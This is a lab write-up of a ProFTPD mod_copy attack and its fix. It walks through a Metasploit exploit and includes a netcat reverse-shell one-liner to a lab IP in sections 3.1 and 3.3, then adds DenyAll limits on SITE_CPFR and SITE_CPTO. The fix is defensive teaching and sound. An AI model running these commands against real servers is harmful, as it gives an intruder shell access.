# 📃 Phase 3: Defensive Strategy

---

## 🛡️ 3.1 Before Defense - Successful Exploitation (Reference from Phase 1)

**Summary:**
- The attacker successfully compromised the victim using the `ProFTPD mod_copy` vulnerability.
- Reverse shell was obtained via Netcat listener.

### Step 1: Scan Victim with Nmap
```bash
nmap -sV 10.0.2.15
```
![10-nmap-scan-results.png](../phase1/screenshots/10-nmap-scan-results.png)

### Step 2: Launch Metasploit
```bash
msfconsole
```
![11-launch-msfconsole.png](../phase1/screenshots/11-launch-msfconsole.png)

### Step 3: Search for mod_copy Module
```bash
search mod_copy
```
![12-search-mod_copy-exploit.png](../phase1/screenshots/12-search-mod_copy-exploit.png)

### Step 4: Select the Exploit
```bash
use exploit/unix/ftp/proftpd_modcopy_exec
```
![13-select-mod_copy-exploit.png](../phase1/screenshots/13-select-mod_copy-exploit.png)

### Step 5: Show Options
```bash
show options
```
![14-show-exploit-options.png](../phase1/screenshots/14-show-exploit-options.png)

### Step 6: Set Target IP and Path
```bash
set RHOSTS 10.0.2.15
set SITEPATH /var/www/html
```
![15-set-RHOST-to-victim-ip.png](../phase1/screenshots/15-set-RHOST-to-victim-ip.png)
![16-set-SITEPATH-to-var-www-html.png](../phase1/screenshots/16-set-SITEPATH-to-var-www-html.png)

### Step 7: Set Payload
```bash
show payloads
```
![17-show-compatible-payloads.png](../phase1/screenshots/17-show-compatible-payloads.png)
```bash
set payload 5
```
![18-set-generic-reverse-shell-payload.png](../phase1/screenshots/18-set-generic-reverse-shell-payload.png)

### Step 8: Verify Options
```bash
show payload options
```
![19-verify-payload-options.png](../phase1/screenshots/19-verify-payload-options.png)

### Step 9: Set CMD for Reverse Shell
```bash
set CMD /tmp/mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.2.6 4444 > /tmp/f
```
![20-set-CMD-netcat-reverse-shell.png](../phase1/screenshots/20-set-CMD-netcat-reverse-shell.png)

### Step 10: Allow No Cleanup
```bash
set AllowNoCleanup true
```
![21-set-AllowNoCleanup-true.png](../phase1/screenshots/21-set-AllowNoCleanup-true.png)

### Step 11: Start Netcat Listener
```bash
nc -lnvp 4444
```
![22-start-netcat-listener.png](../phase1/screenshots/22-start-netcat-listener.png)

### Step 12: Run Exploit
```bash
run
```
![23-run-exploit.png](../phase1/screenshots/23-run-exploit.png)

### Step 13: Verify Shell Access
```bash
whoami
```
![24-successful-reverse-shell-access.png](../phase1/screenshots/24-successful-reverse-shell-access.png)

---

## 🔧 3.2 Defensive Action - Secure ProFTPD Configuration

### Step 1: Edit ProFTPD Configuration
```bash
sudo nano /opt/proftpd/etc/proftpd.conf
```
![1-open-proftpd-conf.png](./screenshots/1-open-proftpd-conf.png)

### Step 2: Scroll to Bottom
![2-scroll-to-bottom-proftpd-conf.png](./screenshots/2-scroll-to-bottom-proftpd-conf.png)

### Step 3: Add DenyAll Blocks
```apache
<Limit SITE_CPFR>
  DenyAll
</Limit>
<Limit SITE_CPTO>
  DenyAll
</Limit>
```
![3-add-denyall-blocks.png](./screenshots/3-add-denyall-blocks.png)

### Step 4: Save Changes
![4-save-changes-proftpd.png](./screenshots/4-save-changes-proftpd.png)

### Step 5: Restart ProFTPD
```bash
sudo service proftpd restart
```
![5-restart-proftpd.png](./screenshots/5-restart-proftpd.png)

---

## 🧪 3.3 After Defense - Attack Attempt Fails

### Step 1: Re-scan Victim
```bash
nmap -sV 10.0.2.15
```
![6-re-run-nmap.png](./screenshots/6-re-run-nmap.png)

### Step 2: Relaunch Metasploit
```bash
msfconsole
```
![7-re-launch-msfconsole.png](./screenshots/7-re-launch-msfconsole.png)

### Step 3: Search mod_copy Again
```bash
search mod_copy
```
![8-search-modcopy-again.png](./screenshots/8-search-modcopy-again.png)

### Step 4: Set RHOSTS and SITEPATH Again
```bash
set RHOSTS 10.0.2.15
set SITEPATH /var/www/html
```
![9-set-rhosts-and-sitepath-again.png](./screenshots/9-set-rhosts-and-sitepath-again.png)

### Step 5: Attempt Payload Setup (Fails)
```bash
set CMD /tmp/mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.2.6 4444 > /tmp/f
set AllowNoCleanup true
```
![10-show-payloads-error.png](./screenshots/10-show-payloads-error.png)
![11-show-options-and-set-cmd.png](./screenshots/11-show-options-and-set-cmd.png)

### Step 6: Start Netcat Listener Again
```bash
nc -lnvp 4444
```
![12-start-netcat-listener-again.png](./screenshots/12-start-netcat-listener-again.png)

### Step 7: Run Exploit Again
```bash
run
```
![13-run-exploit-again-fails.png](./screenshots/13-run-exploit-again-fails.png)

### Step 8: Confirm No Shell
```bash
whoami
```
![14-whoami-fails.png](./screenshots/14-whoami-fails.png)

---

# ✅ Conclusion

| Step | Status |
|:----|:------|
| Exploit before defense | ✅ Successful |
| Defense implemented | ✅ Successful |
| Exploit after defense | ❌ Failed (Defense works) |

- The ProFTPD service is now secure against `mod_copy` attacks.

---
